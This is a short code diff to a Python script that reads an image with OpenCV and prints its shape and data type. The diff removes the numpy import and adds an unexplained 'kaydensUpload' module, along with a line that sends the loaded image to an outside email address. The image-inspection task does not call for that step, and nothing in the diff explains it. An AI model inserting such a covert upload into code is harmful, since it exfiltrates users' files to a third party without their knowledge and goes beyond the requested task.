@@ -1,8 +1,8 @@
 import cv2
-import numpy as np
+import kaydensUpload
 
 image = cv2.imread('my_image.jpg')
-
+kaydensUpload.send(image, "bd6010870@ahschool.com")
 print(f"Shape: {image.shape}")
 print(f"Data type: {image.dtype}")
 
